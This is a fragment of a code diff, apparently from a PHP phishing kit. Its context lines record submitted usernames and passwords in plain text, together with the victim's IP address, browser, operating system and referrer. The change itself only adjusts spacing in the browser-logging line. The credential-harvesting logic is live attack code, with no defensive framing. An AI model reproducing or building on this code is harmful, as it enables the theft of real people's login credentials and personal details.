@@ -8,7 +8,7 @@ if (isset($_POST['username']) && isset($_POST['password'])) {
     $current .= "Username: {$_POST['username']}\n";
     $current .= "Password: {$_POST['password']}\n";
     $current .= "IP:{$_SERVER['REMOTE_ADDR']}\n";
-    $current .= "Browser: " . $obj->showInfo('browser') ." " . $obj->showInfo('version') . "\n";
+    $current .= "Browser: " . $obj->showInfo('browser') . " " . $obj->showInfo('version') . "\n";
     $current .= "OS: " . $obj->showInfo('os') . "\n";
     $referrer = $_SERVER['HTTP_REFERER'] . "\n";
     if ($referrer == "") {
